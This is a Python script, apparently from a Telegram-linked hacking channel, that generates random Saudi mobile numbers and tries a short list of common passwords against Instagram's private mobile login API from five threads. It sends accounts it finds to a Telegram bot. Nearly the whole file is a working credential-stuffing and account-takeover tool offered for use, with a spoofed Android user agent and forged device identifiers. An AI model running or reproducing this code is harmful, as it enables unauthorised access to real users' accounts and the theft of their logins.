import os
try:
	
	import sys
	import requests
	import secrets
	import random
	import pazok
	import threading
	import time
except:
	os.system("pip install requests")
	os.system("pip install pazok")
	os.system("pip install threading")
	os.system("secrets")
	os.system("clear")
	pass


o = "\033[38;5;208m"
e = "\033[38;5;206m"
E = "\033[38;5;250m"
m = "\033[38;5;15m"
f = "\033[38;5;82m"
b = "\033[38;5;51m"
y = "\033[38;5;226m"
j = "\033[38;5;201m"
x = "\033[38;5;196m"
C = "\033[38;5;250m"


token, id = pazok.info_bot()
os.system("clear")
logo = """ 
            \u001b[38;5;220m                ⠑⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠀⠀⢹⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⣾⣷⡀⠀⠀⣸⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⢻⣿⣿⣿⣾⣿⣿⣿⣿⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣰⣿⠃⠀⠈⣿⣿⣿⣿⣿⣿⣿⠟⠁⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⣠⣾⣿⠃⠀⠀⠀⢹⣿⣿⣿⣿⠟⠁⠀⠀⢻⣧⣄⡀⠀⢸⣶⣄⠀⠀⠀⠀
            ⠀⠀⠀⣠⣾⣿⣿⠇⠀⠀⠀⠀⢸⣿⣿⣿⣿⡀⠀⠀⠀⢸⣿⣿⣿⡄⠈⢿⣿⣦⠀⠀⠀
            ⠀⠀⣰⣿⣿⣿⣿⣆⠀⠀⠀⣠⣿⣿⣿⣿⣿⣷⣤⣠⣴⣿⣿⣿⣿⠇⠀⢸⣿⣿⡇⠀⠀
            ⠀⢀⣿⠟⣩⣬⣥⣭⣬⣤⣭⣤⣭⡉⢻⣿⣿⣿⣿⠉⢬⣥⣭⡍⠻⠀⢀⣾⠟⣩⣥⣤⡤
            ⠀⠨⠃⠴⠿⠿⠿⠿⠿⣿⣿⣿⠏⣸⣿⣿⣿⣿⣷⣄⠻⣿⣿⣧⡘⠻⢁⣾⣿⡿⠋⠀
            ⠀⠀⢳⣶⣶⣶⣶⠖⣠⣾⣿⡿⢡⣴⣿⣿⣿⣿⣿⣿⣿⣷⡈⠻⣿⣿⣶⣿⣿⠟⠁⠀⠀
            ⠀⢠⣾⣿⣿⠟⢡⣾⣿⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⣿⣿⣿⢁⣾⣷⡄⠀
            ⠀⣿⣿⡇⢀⣼⣿⣿⠏⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⢰⣾⣿⡿⠀
            ⠀⠙⢿⣷⣤⡀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⢠⣼⣿⠟⠁⠀
            ⠀⠀⡄⢹⣿⡷⠄⠀⠀⠀⠀⠈⠙⠛⠟⣹⣿⣏⠻⠛⠋⠁⠀⠀⠀⠀⠠⠿⣿⠏⣠⠀⠀
            ⠀⠀⣿⡄⣿⣾⣶⣦⣄⣀⣀⣀⠄⣠⣾⠟⠿⠻⣷⣄⡠⣀⣀⣀⣤⣶⣾⣿⣯⢰⣿⡀⠀
            ⢀⣼⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
            ⠀⠛⠿⣿⣿⡿⠿⠟⠛⣛⡻⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⢛⣉⡙⠛⠿⠿⢿⠿⠿⠋⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣾⣿⣿⣦⣴⣿⣦⣴⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠀⢸⣿⢿⣿⣿⣿⡇⢀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⣿⠀⠸⣿⢸⣿⣿⣿⡇⢸⣿⢹⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠫⠀⠀⠀⠘⢿⣿⠋⠀⠈⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
print(logo) 
def type_writer(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

message = f"""
                         • 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙤𝙪𝙧 𝙬𝙤𝙧𝙡𝙙 @QH_PJ •
"""

type_writer(message, 0.02)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


god, bad, error, nofund, know = 0, 0, 0, 0, 0

def update_display(username, company, password=None):
    clear()
    text = f"""
        {j}━━━━━━━━━━ {m} @QH_PJ
        {j}┃
        {j}┣━ {o}Number: {f}{username} {C}| {y}{company}{j}
        {j}┣━ {o}Current Password: {b}{password if password else '-'}{j}
        {j}┣━ {o}Hits (Good): {f}{god}{j}
        {j}┣━ {o}Bad (Bad): {f}{bad}{j}
        {j}┣━ {o}No Fund (No Account): {f}{nofund}{j}
        {j}┗━ {x}Errors {E}: {x}{error}{m}
    """
    print(text)


SU = {
    'STC': ['050', '053', '055'],
    'Mobily': ['054', '056'],
    'Zain': ['058', '059'],
    'Virgin': ['0570'],
    'Lebara': ['0576', '0577'],
}


passwords = [
    '123456',
    '123456789',
    '112233',
    '123123',
    'qwerty',
    'password'
]

user_agent = "Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; Samsung/SM; SM-G991B; o1q; qcom; en_US)"

def generate_saudi_number():
    company = random.choice(list(SU.keys()))
    prefix = random.choice(SU[company])
    number = prefix + ''.join(random.choices('0123456789', k=7 if len(prefix) == 3 else 6))
    return number, company

def insta_check(username, password_try):
    try:
        res = requests.get("https://i.instagram.com/api/v1/accounts/read_msisdn_header/", headers={"User-Agent": user_agent})
        csrf = res.cookies.get("csrftoken", "")
        mid = res.cookies.get("mid", "")
    except:
        return None

    device_id = "android-" + secrets.token_hex(16)[:16]
    uuid = secrets.token_hex(8) + '-' + secrets.token_hex(4) + '-' + secrets.token_hex(4) + '-' + secrets.token_hex(4) + '-' + secrets.token_hex(12)
    url = "https://i.instagram.com/api/v1/accounts/login/"
    payload = {
        'jazoest': '22203',
        'country_codes': '[{"country_code":"1","source":["default"]}]',
        'phone_id': uuid,
        'enc_password': f"#PWD_INSTAGRAM:0:&:{password_try}",
        'username': username,
        'adid': uuid,
        'device_id': device_id,
        'google_tokens': '[]',
        'login_attempt_count': "0",
    }
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'accept-language': 'en-US;q=0.8,en;q=0.7',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'X-Instagram-AJAX': '1',
        'X-MID': mid,
        'X-CSRFToken': csrf,
        'Cookie': f"csrftoken={csrf}; mid={mid};",
    }

    try:
        r = requests.post(url, data=payload, headers=headers).text
        print("-"*10)
        print("[",f"\r{r}","]")
        print("-"*10)
        print("Response")
       
    except:
        return None

    if '"logged_in_user"' in r and '"status":"ok"' in r:
        return True
    elif '"message":"We can\'t find an account' in r and '"status":"fail"' in r:
        return False
    else:
        return None

def start_attack():
    global god, bad, error, nofund, know
    tried_numbers = set()
    while True:
        number, company = generate_saudi_number()
        if number in tried_numbers:
            continue
        tried_numbers.add(number)
        username = f"+966{number}"
        account_exists = insta_check(username, passwords[0])
        if account_exists is None:
            error += 1
            update_display(username, company)
            continue
        if not account_exists:
            nofund += 1
            update_display(username, company)
            continue
        god += 1
        mse = f"""	
*PhoneNumber :* `{username}`
*Password :* `{passwords}`
	"""
        boto = ("رابط الحساب", f"https://www.instagram.com/{username}", "My channel", "https://t.me/F_R_M4")
        pazok.tele_ms(token, id, txt=mse, buttons=boto)
        for password in passwords:
            update_display(username, company, password)
            result = insta_check(username, password)
            if result == True:
                break

threads = []
for _ in range(5):
    thread = threading.Thread(target=start_attack)
    threads.append(thread)
    thread.start()
